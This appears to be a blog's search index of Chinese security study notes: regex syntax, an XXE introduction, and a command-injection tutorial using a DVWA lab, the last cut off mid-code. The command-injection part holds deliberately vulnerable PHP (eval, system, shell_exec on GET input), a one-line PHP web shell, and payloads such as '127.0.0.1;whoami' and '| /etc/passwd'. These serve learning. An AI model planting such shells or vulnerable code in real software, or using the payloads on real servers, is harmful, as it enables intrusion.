<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>正则表达式学习</title>
      <link href="/2024/09/16/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/09/16/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h3><p><strong>介绍</strong>：普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ABC]</span><br><span class="line">匹配[]内的所有字符，这里匹配ABC</span><br><span class="line"></span><br><span class="line">[^ABC]</span><br><span class="line">匹配除了[]内的所有字符，这里匹配除了ABC之外的所有字符</span><br><span class="line"></span><br><span class="line">[A-Z]</span><br><span class="line">这里A-Z代表一个区间，表示匹配A-Z的所有字符</span><br><span class="line"></span><br><span class="line">[\s\S]</span><br><span class="line">表示匹配所有，其中\s匹配空白和换行；\S匹配除了空白和换行其余的字符</span><br><span class="line"></span><br><span class="line">\w</span><br><span class="line">匹配所有的字母，数字和下划线，等价于[A-Za-z0-9_]</span><br><span class="line"></span><br><span class="line">\d</span><br><span class="line">匹配所有数字，等价于[0-9]</span><br></pre></td></tr></table></figure><h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p><strong>介绍</strong>：非打印字符也可以是正则表达式的组成部分，在正则表达式中，非打印字符是指那些在文本中不产生视觉效果的字符，比如空格、换行符、制表符等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">\cx</span><br><span class="line">匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的&#x27;c&#x27;字符。</span><br><span class="line"></span><br><span class="line">\f</span><br><span class="line">匹配一个换页符。等价于\x0c和\cL。</span><br><span class="line"></span><br><span class="line">\n</span><br><span class="line">匹配一个换行符。等价于\x0a和\cJ。</span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">匹配一个回车符。等价于\x0d和\cM。</span><br><span class="line"></span><br><span class="line">\t</span><br><span class="line">匹配一个制表符。等价于\x09和\cI。</span><br><span class="line"></span><br><span class="line">\v</span><br><span class="line">匹配一个垂直制表符。等价于\x0b和\cK。</span><br><span class="line"></span><br><span class="line">\s</span><br><span class="line">匹配任何空白字符，包括空格、制表符、换页符等等。等价于[\f\n\r\t\v]。注意Unicode正则表达式会匹配全角空格符。</span><br><span class="line"></span><br><span class="line">\S</span><br><span class="line">匹配任何非空白字符。等价于[^\f\n\r\t\v]。</span><br></pre></td></tr></table></figure><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p><strong>介绍</strong>：特殊字符用于定义匹配模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">匹配任意单个字符（除换行符\n），要匹配.字符本身，请使用 \.</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line">匹配输入的开始，要匹配^字符本身，请使用 \^</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line">匹配输入的结束位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 &#x27;\n&#x27; 或 &#x27;\r&#x27;。要匹配 $ 字符本身，请使用 \$。</span><br><span class="line"></span><br><span class="line">( )</span><br><span class="line">分组，记住匹配的内容，或用于匹配子匹配，要匹配这些字符，请使用 \( 和 \)。</span><br><span class="line"></span><br><span class="line">*</span><br><span class="line">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</span><br><span class="line"></span><br><span class="line">\</span><br><span class="line">转义字符，用于匹配特殊字符本身或使后续字符成为特殊字符。例如， &#x27;n&#x27; 匹配字符 &#x27;n&#x27;。&#x27;\n&#x27; 匹配换行符。序列 &#x27;\\&#x27; 匹配 &quot;\&quot;，而 &#x27;\(&#x27; 则匹配 &quot;(&quot;。</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line">匹配左侧或右侧的表达式。要匹配 |，请使用 \|。</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">标记限定符表达式的开始。要匹配 &#123;，请使用 \&#123;。</span><br><span class="line"></span><br><span class="line">&#123;n&#125;</span><br><span class="line">匹配前面的元素恰好n次</span><br><span class="line"></span><br><span class="line">&#123;n,&#125;</span><br><span class="line">匹配前边的元素至少n次</span><br><span class="line"></span><br><span class="line">&#123;n,m&#125;</span><br><span class="line">匹配前边的元素至少n次，但不超过m次</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">标记一个中括号表达式的开始。要匹配 [，请使用 \[。</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">匹配括号内的任意一个字符</span><br></pre></td></tr></table></figure><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p><strong>介绍</strong>：正则表达式中的限定符用于指定匹配的次数或范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">匹配前面的元素零次或多次。例如，zo* 能匹配 &quot;z&quot; 以及 &quot;zoo&quot;。* 等价于 &#123;0,&#125;。</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">匹配前面的元素一次或多次。zo+ 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 &#123;1,&#125;。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">匹配前面的元素零次或一次，或表示非贪婪匹配。do(es)? 可以匹配 &quot;do&quot; 、 &quot;does&quot;、 &quot;doxy&quot; 中的 &quot;do&quot; 和 &quot;does&quot;。? 等价于 &#123;0,1&#125;。</span><br><span class="line"></span><br><span class="line">&#123;n&#125;</span><br><span class="line">匹配前面的元素恰好n次。o&#123;2&#125; 不能匹配 &quot;Bob&quot; 中的 o，但是能匹配 &quot;food&quot; 中的两个 o。</span><br><span class="line"></span><br><span class="line">&#123;n,&#125;</span><br><span class="line">匹配前面的元素至少n次。o&#123;2,&#125; 不能匹配 &quot;Bob&quot; 中的 o，但能匹配 &quot;foooood&quot; 中的所有 o。o&#123;1,&#125; 等价于 o+。o&#123;0,&#125; 则等价于 o*。</span><br><span class="line"></span><br><span class="line">&#123;n,m&#125;</span><br><span class="line">匹配前面的元素至少n次，但不超过m次。例如，o&#123;1,3&#125; 将匹配 &quot;fooooood&quot; 中的前三个 o。o&#123;0,1&#125; 等价于 o?。请注意在逗号和两个数之间不能有空格。</span><br></pre></td></tr></table></figure><h4 id="特性：贪婪和非贪婪"><a href="#特性：贪婪和非贪婪" class="headerlink" title="特性：贪婪和非贪婪"></a>特性：贪婪和非贪婪</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">##这里拿菜鸟教程的一个例子</span><br><span class="line">/[1-9][0-9]*/；我们希望拿这个正则表达式实现查找1到99的的所有数字。</span><br><span class="line">这里的[1-9]实现开头的那一位数不为0，[0-9]则不对后边的数字做限制，后边加*意图实现匹配[1-9][0-9]这个元素多次，实现查找所有的[1-9][0-9]；但是由于*是贪婪的，会匹配前面的元素零次或多次，所以这个正则表达式实现的效果是匹配从1开始的所有正整数；</span><br><span class="line">而/[1-9][0-9]+/中，由于+也是贪婪的，且限定最少两位数&#123;1，&#125;，所以会匹配10以上的所有正整数；</span><br><span class="line">所以这里我们要使用/[1-9][0-9]?/,这里？即&#123;0，1&#125;可以实现匹配从1到99的所有数字，且他是非贪婪的，所以不会匹配更多位数的数字。</span><br><span class="line"></span><br><span class="line">##另一个例子</span><br><span class="line">我们要实现匹配&lt;h1&gt;whoami&lt;h1&gt;这个标签，这时我们如果使用/&lt;.*&gt;/来实现匹配&lt;&gt;内的所有内容，但是由于*是贪婪的，所以会导致我们不止会匹配h1，而是会匹配所有的&lt;&gt;内的标签，这时我们只需要将*和？组合就可以实现匹配一个&lt;&gt;标签内容。</span><br></pre></td></tr></table></figure><h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><p><strong>介绍</strong>:正则表达式中的定位符用于指定匹配位置，而不是字符本身。+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">^</span><br><span class="line">匹配字符串的开头。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line">匹配字符串的结尾。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</span><br><span class="line"></span><br><span class="line">\b</span><br><span class="line">匹配单词边界（单词的开始或结束）。</span><br><span class="line"></span><br><span class="line">\B</span><br><span class="line">匹配非单词边界。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 正则表达式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE（XML外部实体注入）相关学习</title>
      <link href="/2024/09/07/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/09/07/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##XML介绍</span><br><span class="line">XML（Extensible Markup Language）是一种类似于 [HTML](https://developer.mozilla.org/zh-CN/docs/Glossary/HTML)，但是没有使用预定义标记的语言。因此，可以根据自己的设计需求定义专属的标记。这是一种强大将数据存储在一个可以存储、搜索和共享的格式中的方法。最重要的是，因为 XML 的基本格式是标准化的，如果你在本地或互联网上跨系统或平台共享或传输 XML，由于标准化的 XML 语法，接收者仍然可以解析数据。</span><br></pre></td></tr></table></figure><p>XML外部实体注入简称XXE漏洞，是一种针对应用程序处理XML数据的方式的攻击。在这种攻击中，攻击者利用应用程序对XML输入的处理不当，引入或“注入”恶意内容。这可能导致未授权的数据访问、服务拒绝攻击甚至执行远程代码。</p><h2 id="XXE漏洞攻击"><a href="#XXE漏洞攻击" class="headerlink" title="XXE漏洞攻击"></a>XXE漏洞攻击</h2><p>如果服务端处理XML的代码中没有限制XML引入外部实体，那么创建一个包含外部实体的XML时，外部实体的内容就会被执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">采用XML格式时，报文中的mime会带有XML类型</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>命令注入与文件上传相关学习</title>
      <link href="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h3 id="一些概念补充"><a href="#一些概念补充" class="headerlink" title="一些概念补充"></a>一些概念补充</h3><h4 id="服务器概念补充"><a href="#服务器概念补充" class="headerlink" title="服务器概念补充"></a><strong>服务器概念补充</strong></h4><p>服务器是安装了某项服务的机器，不仅可以供本机使用也可以使外部机器使用。</p><p>简单来说就是每台机器上装载了类似于mysql数据库之类的东西，然后通过类似映射的手段来使该服务在其他的机器上也可以使用。</p><p>那么在找寻某项服务是，就需要搜索ip（该主机地址）+端口号（锁定某项服务，例如ssh服务端口。）</p><h4 id="ip概念补充"><a href="#ip概念补充" class="headerlink" title="ip概念补充"></a><strong>ip概念补充</strong></h4><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182301024.png" class="" title="image-20240905182301024"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">公网和局域网是计算机网络中两个不同的概念。</span><br><span class="line"></span><br><span class="line">公网（Internet）是指全球范围内互联的计算机网络，它由各种全球性和区域性网络互相连接而成。公网通过广域网（WAN）技术实现，可以覆盖整个地球，并提供各种服务，如电子邮件、网页浏览、文件传输等。公网是开放的，任何拥有合法权限的用户都可以访问。</span><br><span class="line"></span><br><span class="line">局域网（LAN）是指在一个相对较小的地理范围内的计算机网络，通常限制在某个建筑物、办公室、校园或家庭内部。局域网通过局域网技术实现，一般使用以太网或Wi-Fi无线网络进行连接。局域网主要用于内部资源共享、打印机共享、文件传输和内部通信等。局域网通常由路由器或交换机连接到公网，以便局域网中的计算机可以访问公网上的资源。</span><br><span class="line"></span><br><span class="line">公网和局域网之间的联系主要是通过路由器实现的。路由器连接了公网和局域网，并负责将从公网发来的数据包转发给局域网中的适当设备，同时也负责将局域网中的数据包发送到公网。这样，局域网中的设备可以通过路由器与公网上的其他设备进行通信。</span><br><span class="line"></span><br><span class="line">总结起来，公网是全球范围内互联的网络，而局域网是限定在一个相对较小地理范围内的网络。它们之间通过路由器进行连接和通信。</span><br></pre></td></tr></table></figure><h5 id="不同类型局域网的应用场景"><a href="#不同类型局域网的应用场景" class="headerlink" title="不同类型局域网的应用场景"></a><strong>不同类型局域网的应用场景</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不同的IP地址段可用于不同的局域网场景。以下是一些常见的情况：</span><br><span class="line"></span><br><span class="line">1. 192.168.x.x地址段：这是一个私有IP地址段，通常用于家庭、小型企业和组织的局域网中。例如，192.168.0.1或192.168.1.1通常用作路由器的默认IP地址。</span><br><span class="line">2. 172.16.x.x至172.31.x.x地址段：这也是一个私有IP地址段，通常用于中等规模企业、大型机构或学校的局域网中。</span><br><span class="line">3. 10.x.x.x地址段：这也是一个私有IP地址段，通常用于大型企业、学校和政府机构的局域网中。</span><br><span class="line">4. 公司或组织分配的自定义IP地址段：某些组织可能会向其员工或客户分配自定义的IP地址段，这些地址段可用于局域网中的特定场景。</span><br><span class="line">5. 其他公共IP地址段：除了上述私有IP地址段外，还有其他公共IP地址段可用于局域网中，如169.254.x.x地址段和100.64.x.x至100.127.x.x地址段等。</span><br><span class="line"></span><br><span class="line">在选择使用哪种IP地址段时，需要考虑到局域网的规模、安全需求、网络拓扑结构等因素。</span><br></pre></td></tr></table></figure><h5 id="docker镜像网络概念补充"><a href="#docker镜像网络概念补充" class="headerlink" title="docker镜像网络概念补充"></a>docker镜像网络概念补充</h5><p>docker镜像的网络是虚拟机（vmware）以自己的网络（物理机网络）构造的虚拟网络。通过端口映射来使外部机器来访问。</p><h3 id="DVWA靶场搭建"><a href="#DVWA靶场搭建" class="headerlink" title="DVWA靶场搭建"></a>DVWA靶场搭建</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><strong>在kali中使用docker搭建命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search dvwa</span><br></pre></td></tr></table></figure><p><strong>在弹出的选项中选择要下载的镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像id</span><br></pre></td></tr></table></figure><h4 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h4><p><strong>下载完之后就可以使用容器调用镜像了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 8080:80 -p 3307:3307 镜像id（这里由于80端口占用所以使用8080端口，打开的映像端口为3307）</span><br></pre></td></tr></table></figure><p><strong>之后就可以通过访问<em>ip：端口号</em>的方式访问该靶场</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182324611.png" class="" title="image-20240905182324611"><p><strong>点击红框处重置账密</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182338806.png" class="" title="image-20240905182338806"><p><strong>之后输入默认账密（admin：password）登入</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182350642.png" class="" title="image-20240905182350642"><p><strong>设置难度（这里推荐low难度）</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182359872.png" class="" title="image-20240905182359872"><h3 id="命令注入漏洞详解"><a href="#命令注入漏洞详解" class="headerlink" title="命令注入漏洞详解"></a>命令注入漏洞详解</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">命令注入（Command Injection）是一种常见的web应用程序漏洞，它允许攻击者在目标系统上执行恶意命令。这种漏洞通常发生在web应用程序使用用户提供的输入来构造操作系统命令的情况下。</span><br><span class="line"></span><br><span class="line">命令注入漏洞的原理是，当web应用程序对用户输入进行不充分的验证和过滤时，攻击者可以通过在可执行命令中注入恶意代码来执行任意命令。这样的注入通常发生在用户输入被直接或间接地传递给操作系统命令执行函数时。</span><br><span class="line"></span><br><span class="line">以下是一个简单的示例来说明命令注入漏洞的原理：</span><br><span class="line"></span><br><span class="line">假设有一个web应用程序，它接受用户的姓名并在服务器上运行一个命令来创建一个新的用户账户。应用程序可能会将用户提供的姓名作为参数传递给一个命令。</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">例如：system(&quot;useradd &quot; + username);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">如果应用程序没有正确验证和过滤用户提供的姓名，攻击者可以通过在姓名字段中注入恶意代码来执行任意命令。例如，攻击者可以输入以下内容作为姓名：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">&quot;; ls; echo &quot;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">这将会导致应用程序构造以下命令并在服务器上执行：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">system(&quot;useradd &quot;; ls; echo &quot;&quot;);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">攻击者成功地注入了一个额外的命令（`ls`），并且该命令会在应用程序中执行。</span><br><span class="line"></span><br><span class="line">通过利用命令注入漏洞，攻击者可以执行任意系统命令，包括查看、修改或删除文件，创建新的用户账户以及在目标系统上执行其他恶意操作。因此，对于接受用户输入并构造系统命令的web应用程序，必须进行严格的输入验证和过滤，以防止命令注入漏洞的利用。</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182412197.png" class="" title="image-20240905182412197"><p><strong>简单来说就是如果网页使用一些危险函数（如上图所示）导致用户提交的数据当做函数中的一部分被执行，如果用户提交的数据中包含一些命令，导致命令被执行（比如说上图中的用户提交ip加一个分号（php中一个命令后加入逻辑运算符后再写入另一个命令，可以使这两个命令，或重复此操作后的更多指令同时运行；）），则会导致严重的后果。</strong></p><p><strong>[但是这个漏洞在黑盒测试中很少，该漏洞一般是在白盒测试中被审计挖掘出来的。（补充：黑盒测试即只有一条网站链接来进行渗透测试的漏洞，白盒测试则是拥有网站源代码可以进行代码审计的渗透测试。）]</strong></p><p><strong>例如：在输入127.0.0.1;whoami后会回显以下信息（甚至可以不传入原有要求传入值，只传入逻辑运算符加命令，也可以运行该命令，并在报错信息下方回显命令要求的信息数据。）</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182422810.png" class="" title="image-20240905182422810"><p><strong>可以看到，除了ping指令执行的效果之外，还执行了whoami指令，并回弹相应的信息。</strong></p><h4 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h4><h5 id="1-eval（）函数造成的命令注入漏洞"><a href="#1-eval（）函数造成的命令注入漏洞" class="headerlink" title="1.eval（）函数造成的命令注入漏洞"></a>1.eval（）函数造成的命令注入漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法</span><br><span class="line">eval（phpcode）</span><br><span class="line">Phpcode 规定要计算的php代码。通常用分号结束每句代码的执行。</span><br><span class="line"></span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$var = &quot;var&quot;;</span><br><span class="line">if(isset($_GET[&quot;name&quot;]))&#123;</span><br><span class="line">$arg = $_GET[&quot;name&quot;];</span><br><span class="line">eval(&quot;\$var=$arg;&quot;);</span><br><span class="line">echo &quot;\$var = &quot;.$var;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">3、常用一句话木马</span><br><span class="line">&lt;?php @eval($_GET[&#x27;qwe&#x27;]);?&gt;</span><br><span class="line">---------------------------------------------------</span><br><span class="line">@表示后面即使执行错误，也不报错。                       |</span><br><span class="line">eval()函数表示括号内的语句字符串什么的全都当做PHP代码执行。|</span><br><span class="line">$_POST[&#x27;pass&#x27;]表示从页面中获得pass这个参数值。         |</span><br><span class="line">---------------------------------------------------</span><br><span class="line">构造语句：</span><br><span class="line">name=phpinfo()</span><br></pre></td></tr></table></figure><h5 id="2-system-函数造成的漏洞"><a href="#2-system-函数造成的漏洞" class="headerlink" title="2.system()函数造成的漏洞"></a>2.system()函数造成的漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法:</span><br><span class="line">System(string command,int &amp;return_var)</span><br><span class="line">Command 要执行的命令</span><br><span class="line">Return_var 存放命令的执行后的状态值</span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">echo system(&quot;dir&quot;.$cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">构造语句：</span><br><span class="line">Cmd=| /etc/passwd</span><br></pre></td></tr></table></figure><h5 id="3-shell-exec-函数造成的漏洞"><a href="#3-shell-exec-函数造成的漏洞" class="headerlink" title="3.shell_exec()函数造成的漏洞"></a>3.shell_exec()函数造成的漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法：</span><br><span class="line">shell_exec(string command)</span><br><span class="line">command 要执行的命令</span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">echo &quot;&lt;h3&gt;&quot;;</span><br><span class="line">echo 